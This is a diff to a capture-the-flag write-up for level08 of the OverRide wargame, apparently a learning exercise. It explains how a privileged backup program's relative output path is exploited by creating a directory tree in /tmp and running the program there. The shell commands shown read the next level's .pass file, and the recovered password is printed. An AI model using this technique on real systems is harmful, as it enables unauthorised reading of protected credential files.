@@ -16,6 +16,16 @@ Usage: ./level08 filename
 ERROR: Failed to open (null)
 level08@OverRide:~$ ./level08 /home/users/level09/.pass
 ERROR: Failed to open ./backups//home/users/level09/.pass
-level08@OverRide:~$ ./level08 home/users/level09/.pass
-ERROR: Failed to open home/users/level09/.pass
+```
+
+The program take a file path as argument and make a backup of its content.
+It can't create the backup because the directory containing it doesn't exist.
+
+We will create the directory that it need but in /tmp to have the right permission, executing the program in /tmp will use our newly directory to do the backup because the backup path is relative.
+
+```Shell
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat /tmp/backups/home/users/level09/.pass 
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
 ```
